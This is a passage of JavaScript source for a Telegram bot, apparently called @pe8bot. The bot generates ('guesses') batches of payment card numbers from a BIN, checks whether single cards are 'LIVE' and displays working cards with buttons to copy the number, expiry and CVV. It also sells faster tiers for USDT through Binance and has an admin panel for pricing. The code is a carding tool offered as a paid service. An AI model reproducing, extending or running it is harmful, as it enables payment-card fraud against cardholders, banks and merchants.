                await bot.sendMessage(chatId, 'ماذا تريد أن تفعل؟', { reply_markup: { inline_keyboard: buttons } });
                state.step = 'awaiting_decision';
                return;
            } else {
                state.step = 'awaiting_count';
                await bot.sendMessage(chatId, `🔢 كم عدد الفيزات التي تريد تخمينها على BIN: ${bin}؟\n(الحد الأدنى 5، الحد الأقصى ${getSubscriber(chatId).cardsLimit})`);
            }
        }
        return;
    }
    
    // حالة انتظار العدد لكل BIN (عند عدم وجود عدد افتراضي)
    if (state && state.step === 'awaiting_count') {
        const count = parseInt(text);
        if (isNaN(count)) {
            await bot.sendMessage(chatId, '⚠️ يرجى إرسال رقم صحيح.');
            return;
        }
        const subscriber = getSubscriber(chatId);
        const maxCards = subscriber.cardsLimit;
        if (!adminSet.has(chatId) && (count < 5 || count > maxCards)) {
            await bot.sendMessage(chatId, dict.count_out_of_range.replace('{max}', maxCards));
            const upgradeBtn = { reply_markup: { inline_keyboard: [[{ text: '💎 عرض الاشتراكات', callback_data: 'menu_subscribe' }]] } };
            await bot.sendMessage(chatId, '⚠️ أنت في الخطة المجانية. قم بترقية خطتك لزيادة الحد الأقصى.', upgradeBtn);
            state.step = 'awaiting_bin';
            return;
        }
        state.bins.push(state.currentBin);
        state.defaultCount = count; // نجعل هذا العدد هو العدد الافتراضي للحملات القادمة
        delete state.currentBin;
        
        await bot.sendMessage(chatId, `✅ تم إضافة BIN: ${state.bins[state.bins.length - 1]} بعدد فيزات ${count}\nالحملات الحالية: ${state.bins.length}\nالعدد الافتراضي أصبح ${count}.`);
        
        const plans = getPlans();
        const maxCampaigns = plans[subscriber.plan].campaignsLimit;
        let buttons = [];
        if (state.bins.length >= maxCampaigns) {
            buttons = [
                [{ text: '🚀 تطوير اشتراكك', callback_data: 'menu_subscribe' }],
                [{ text: '🚀 بدء التخمين', callback_data: 'start_with_default' }],
                [{ text: '❌ إلغاء', callback_data: 'cancel_guess' }]
            ];
        } else {
            buttons = [
                [{ text: '➕ إرسال BIN آخر', callback_data: 'add_another_bin' }],
                [{ text: '🎯 تعيين العدد الافتراضي', callback_data: 'set_default_count' }],
                [{ text: '🚀 بدء التخمين', callback_data: 'start_with_default' }],
                [{ text: '❌ إلغاء', callback_data: 'cancel_guess' }]
            ];
        }
        await bot.sendMessage(chatId, 'ماذا تريد أن تفعل؟', { reply_markup: { inline_keyboard: buttons } });
        state.step = 'awaiting_decision';
        return;
    }
    
    // حالة انتظار تعيين العدد الافتراضي يدويًا
    if (state && state.step === 'awaiting_default_count') {
        const count = parseInt(text);
        if (isNaN(count)) {
            await bot.sendMessage(chatId, '⚠️ يرجى إرسال رقم صحيح.');
            return;
        }
        const subscriber = getSubscriber(chatId);
        const maxCards = subscriber.cardsLimit;
        if (!adminSet.has(chatId) && (count < 5 || count > maxCards)) {
            await bot.sendMessage(chatId, dict.count_out_of_range.replace('{max}', maxCards));
            const upgradeBtn = { reply_markup: { inline_keyboard: [[{ text: '💎 عرض الاشتراكات', callback_data: 'menu_subscribe' }]] } };
            await bot.sendMessage(chatId, '⚠️ أنت في الخطة المجانية. قم بترقية خطتك لزيادة الحد الأقصى.', upgradeBtn);
            state.step = 'awaiting_decision';
            return;
        }
        state.defaultCount = count;
        await bot.sendMessage(chatId, `✅ تم تعيين العدد الافتراضي للحملات إلى ${count}. سيتم تطبيقه على جميع BINs الحالية والمستقبلية.`);
        
        // إعادة عرض القائمة بعد التعيين
        const plans = getPlans();
        const maxCampaigns = plans[subscriber.plan].campaignsLimit;
        let buttons = [];
        if (state.bins.length >= maxCampaigns) {
            buttons = [
                [{ text: '🚀 تطوير اشتراكك', callback_data: 'menu_subscribe' }],
                [{ text: '🚀 بدء التخمين', callback_data: 'start_with_default' }],
                [{ text: '❌ إلغاء', callback_data: 'cancel_guess' }]
            ];
        } else {
            buttons = [
                [{ text: '➕ إرسال BIN آخر', callback_data: 'add_another_bin' }],
                [{ text: '🎯 تعيين العدد الافتراضي', callback_data: 'set_default_count' }],
                [{ text: '🚀 بدء التخمين', callback_data: 'start_with_default' }],
                [{ text: '❌ إلغاء', callback_data: 'cancel_guess' }]
            ];
        }
        await bot.sendMessage(chatId, 'ماذا تريد أن تفعل؟', { reply_markup: { inline_keyboard: buttons } });
        state.step = 'awaiting_decision';
        return;
    }
    
    // أوامر الأدمن النصية (مثل السابق)
    if (state && state.step === 'admin_edit_price') {
        const parts = text.split('=');
        if (parts.length !== 2) { await bot.sendMessage(chatId, 'صيغة غير صحيحة'); return; }
        const planKey = parts[0].trim();
        const newPrice = parseFloat(parts[1]);
        if (isNaN(newPrice)) { await bot.sendMessage(chatId, 'السعر يجب أن يكون رقماً'); return; }
        const plans = getPlans();
        if (!plans[planKey]) { await bot.sendMessage(chatId, `الخطة ${planKey} غير موجودة`); return; }
        plans[planKey].price = newPrice;
        updatePlans(plans);
        await bot.sendMessage(chatId, `✅ تم تحديث سعر خطة ${planKey} إلى ${newPrice} USDT`);
        userStates.delete(chatId);
        await showAdminPanel(chatId);
        return;
    }
    
    if (state && state.step === 'admin_edit_speed') {
        const parts = text.split('=');
        if (parts.length !== 2) { await bot.sendMessage(chatId, 'صيغة غير صحيحة'); return; }
        const planKey = parts[0].trim();
        const newSpeed = parseInt(parts[1]);
        if (isNaN(newSpeed) || newSpeed < 1 || newSpeed > 100) { await bot.sendMessage(chatId, 'السرعة بين 1 و 100'); return; }
        const plans = getPlans();
        if (!plans[planKey]) { await bot.sendMessage(chatId, `الخطة ${planKey} غير موجودة`); return; }
        plans[planKey].speed = newSpeed;
        updatePlans(plans);
        await bot.sendMessage(chatId, `✅ تم تحديث سرعة خطة ${planKey} إلى ${newSpeed}%`);
        userStates.delete(chatId);
        await showAdminPanel(chatId);
        return;
    }
    
    if (state && state.step === 'admin_add_plan') {
        const parts = text.split('|');
        if (parts.length !== 6) { await bot.sendMessage(chatId, 'صيغة غير صحيحة'); return; }
        const [nameAr, nameEn, price, cardsLimit, campaignsLimit, speed] = parts;
        const newPrice = parseFloat(price);
        const newCards = parseInt(cardsLimit);
        const newCamp = parseInt(campaignsLimit);
        const newSpeed = parseInt(speed);
        if (isNaN(newPrice) || isNaN(newCards) || isNaN(newCamp) || isNaN(newSpeed)) {
            await bot.sendMessage(chatId, 'جميع القيم يجب أن تكون أرقاماً');
            return;
        }
        const plans = getPlans();
        const key = nameEn.toLowerCase();
        plans[key] = { nameAr, nameEn, price: newPrice, cardsLimit: newCards, campaignsLimit: newCamp, speed: newSpeed };
        updatePlans(plans);
        await bot.sendMessage(chatId, `✅ تم إضافة خطة جديدة: ${nameAr} (${nameEn})`);
        userStates.delete(chatId);
        await showAdminPanel(chatId);
        return;
    }
    
    if (state && state.step === 'admin_grant') {
        const parts = text.split(' ');
        if (parts.length !== 2) { await bot.sendMessage(chatId, 'صيغة غير صحيحة'); return; }
        const userId = parseInt(parts[0]);
        const planKey = parts[1];
        const plans = getPlans();
        if (!plans[planKey]) { await bot.sendMessage(chatId, `الخطة ${planKey} غير موجودة`); return; }
        const end = new Date();
        end.setMonth(end.getMonth() + 1);
        updateSubscriber(userId, { plan: planKey, startDate: new Date().toISOString(), endDate: end.toISOString() });
        await bot.sendMessage(chatId, `✅ تم منح اشتراك ${planKey} للمستخدم ${userId}`);
        userStates.delete(chatId);
        await showAdminPanel(chatId);
        return;
    }
    
    if (state && state.step === 'admin_remove') {
        const userId = parseInt(text);
        if (isNaN(userId)) { await bot.sendMessage(chatId, 'معرف غير صالح'); return; }
        updateSubscriber(userId, { plan: 'free', startDate: new Date().toISOString(), endDate: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString() });
        await bot.sendMessage(chatId, `✅ تم إلغاء اشتراك المستخدم ${userId}`);
        userStates.delete(chatId);
        await showAdminPanel(chatId);
        return;
    }
    
    // فحص فيزا واحدة
    if (text.includes('|')) {
        await bot.sendMessage(chatId, dict.single_checking);
        const result = await checkSingleCard(text, chatId);
        if (result && result.isLive) {
            const flag = getFlag(result.country);
            const cardType = getCardType(text.split('|')[0]);
            const liveText = dict.live_result
                .replace('{card}', text)
                .replace('{type}', cardType)
                .replace('{country}', result.country)
                .replace('{flag}', flag);
            const buttons = getCopyButtons(text, lang);
            await bot.sendMessage(chatId, liveText, { parse_mode: 'Markdown', ...buttons });
        }
        return;
    }
});

// ==========================================
// الترجمات (كما هي مع إضافة عبارات جديدة)
// ==========================================
const translations = {
    ar: {
        main_menu: '✨ *القائمة الرئيسية* ✨\nاختر أحد الخيارين:',
        btn_guess: '🎲 تخمين مجموعة فيزات',
        btn_single: '🔍 فحص فيزا واحدة',
        btn_subscribe: '💎 الاشتراكات',
        btn_my_campaigns: '📋 حملاي النشطة',
        cancel_btn: '❌ إلغاء',
        btn_copy_full: '📋 نسخ الفيزا كاملة',
        btn_copy_num: '🔢 نسخ الرقم',
        btn_copy_exp: '📅 نسخ التاريخ',
        btn_copy_cvv: '🔐 نسخ CVV',
        enter_bin: '📌 أرسل الـ BIN الخاص بك (أول 6 أرقام أو أكثر)\nمثال: `62581`\nيمكنك إرسال عدة BINs',
        count_out_of_range: '⚠️ العدد يجب أن يكون بين 5 و {max}.',
        cancel_msg: '❌ تم إلغاء العملية.',
        live_result: '✅ تعمل بنجاح ✅\n----------------------------------------\n\n💳    {card}\n\n📊 الحالة: تعمل ✅\n\n🏦 النوع: {type}\n\n🌍 البلد: {country} {flag}\n\n----------------------------------------\nبواسطة: @pe8bot',
        no_live_found: '😞 لم يتم العثور على أي بطاقة صالحة من أصل {total}.',
        new_campaign_btn: '🚀 بدأ حملة جديدة',
        summary: '📊 *الملخص النهائي*\n✅ الصالحة: {hit}\n🎯 المجموع: {total}',
        single_invalid: '📌 أرسل الفيزا كاملة بهذا التنسيق:\n`4111111111111111|01|2031|123`',
        single_checking: '⏳ جاري فحص البطاقة...',
        api_error: '⚠️ حدث خطأ أثناء الاتصال بالخدمة.',
        not_admin: '⛔ هذا الأمر للأدمن فقط.',
        subscription_plans: '💎 *خطط الاشتراك*\nاختر الخطة:',
        already_subscribed: '✅ أنت مشترك بالفعل في خطة {plan}.',
        upgrade_to_pro: '🚀 تطوير إلى Pro',
        upgrade_to_vip: '🚀 تطوير إلى VIP',
        upgrade_suggestion: 'يمكنك ترقية اشتراكك الآن:',
        subscribe_confirm: '✅ اخترت خطة {plan}\nقم بتحويل {amount} USDT إلى معرف بايننس:\n`{payId}`\nواكتب هذا الكود في الملاحظات:\n`{code}`\nثم أرسل صورة التحويل هنا.',
        payment_timeout: '⚠️ لم يتم إرسال صورة التحويل خلال 20 ثانية. يرجى إرسال صورة التحويل للتحقق من الدفعة.',
        payment_received: '📸 تم استلام الصورة. سيتم مراجعتها قريباً.',
        payment_approved: '🎉 تم تفعيل اشتراك {plan} بنجاح!',
        payment_rejected: '❌ تم رفض طلب الاشتراك.',
        campaigns_limit_reached: '⚠️ لقد وصلت للحد الأقصى للحملات المتزامنة ({limit}).',
        campaign_stopped: '🛑 تم إيقاف الحملة {id}.',
        no_active_campaigns: '⚠️ لا توجد حملات نشطة.',
        active_campaigns: '📋 *حملاي النشطة*\n'
    },
    en: {
        main_menu: '✨ *Main Menu* ✨\nChoose an option:',
        btn_guess: '🎲 Guess multiple cards',
        btn_single: '🔍 Check single card',
        btn_subscribe: '💎 Subscriptions',
        btn_my_campaigns: '📋 My active campaigns',
        cancel_btn: '❌ Cancel',
        btn_copy_full: '📋 Copy full card',
        btn_copy_num: '🔢 Copy number',
        btn_copy_exp: '📅 Copy expiry',
        btn_copy_cvv: '🔐 Copy CVV',
        enter_bin: '📌 Send your BIN (first 6 digits or more)\nExample: `62581`\nYou can send multiple BINs',
        count_out_of_range: '⚠️ Count must be between 5 and {max}.',
        cancel_msg: '❌ Operation cancelled.',
        live_result: '✅ LIVE ✅\n----------------------------------------\n\n💳    {card}\n\n📊 Status: LIVE ✅\n\n🏦 Type: {type}\n\n🌍 Country: {country} {flag}\n\n----------------------------------------\nBy: @pe8bot',
        no_live_found: '😞 No live cards found out of {total}.',
        new_campaign_btn: '🚀 Start new campaign',
        summary: '📊 *Final Summary*\n✅ Live: {hit}\n🎯 Total: {total}',
        single_invalid: '📌 Send the full card in this format:\n`4111111111111111|01|2031|123`',
        single_checking: '⏳ Checking card...',
        api_error: '⚠️ API error. Please try again later.',
        not_admin: '⛔ This command is for admins only.',
        subscription_plans: '💎 *Subscription Plans*\nChoose your plan:',
        already_subscribed: '✅ You are already subscribed to {plan} plan.',
        upgrade_to_pro: '🚀 Upgrade to Pro',
        upgrade_to_vip: '🚀 Upgrade to VIP',
        upgrade_suggestion: 'You can upgrade your subscription now:',
        subscribe_confirm: '✅ You selected {plan} plan\nPlease send {amount} USDT to Binance ID:\n`{payId}`\nAnd write this code in the memo:\n`{code}`\nThen send the payment proof photo here.',
        payment_timeout: '⚠️ No payment proof received within 20 seconds. Please send the payment proof photo to verify.',
        payment_received: '📸 Payment proof received. It will be reviewed soon.',
        payment_approved: '🎉 Your {plan} subscription has been activated!',
        payment_rejected: '❌ Subscription request rejected.',
        campaigns_limit_reached: '⚠️ You have reached the maximum concurrent campaigns ({limit}).',
        campaign_stopped: '🛑 Campaign {id} stopped.',
        no_active_campaigns: '⚠️ No active campaigns.',
        active_campaigns: '📋 *Your active campaigns*\n'
    }
};

console.log('✅ البوت يعمل الآن بنظام السرعة المتقدمة والحملات المتوازية وتعيين العدد الافتراضي.');
